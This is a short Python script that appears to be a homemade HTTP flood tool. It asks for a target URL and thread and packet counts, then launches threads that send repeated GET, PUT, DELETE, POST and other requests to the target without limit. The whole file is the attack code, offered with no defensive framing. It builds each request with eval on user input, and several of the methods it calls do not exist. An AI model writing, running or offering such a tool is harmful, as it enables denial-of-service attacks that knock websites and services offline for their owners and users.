import requests
from threading import Thread
global url, time, file
url     =     input("URL (ex: http://domain.com): ")
time    = int(input("Number Of Packets(0-inf): "   ))
threads = int(input("Number Of Threads(0-inf): "   ))

global breakFlag
breakFlag = False

def attack(request):
	global url, time, file
	i = 0
	while True:
		try:
			req = eval("requests."+request+"('"+url+"')")
			print("\n[" + str(i) + "]" + (10 - len(str(i))) * '-' + "["+request+"]" + (15-len(request)) * '-' + "Status Code: " + str(req.status_code))	
		except:
			print("\n[" + str(i) + "]" + (10 - len(str(i))) * '-' + "["+request + "]" + (15-len(request)) * '-' + "error")
		i+=1
		if time != 0:
			if i>time:
				break
def createThreadings():
	global breakFlag
	try:
		Thread(target=lambda: attack("get")).start()
		Thread(target=lambda: attack("put")).start()
		Thread(target=lambda: attack("delete")).start()
		Thread(target=lambda: attack("options")).start()
		Thread(target=lambda: attack("post")).start()
		Thread(target=lambda: attack("head")).start()
		Thread(target=lambda: attack("connect")).start()
		Thread(target=lambda: attack("trace")).start()
		Thread(target=lambda: attack("path")).start()
		Thread(target=lambda: attack("/")).start()
		Thread(target=lambda: attack("ovh")).start()
		Thread(target=lambda: attack("null")).start()
	except:
		breakFlag = True

if(threads != 0):
	for i in range(threads):
		createThreadings()
else:
	while True:
		createThreadings()
		if(breakFlag):
			break

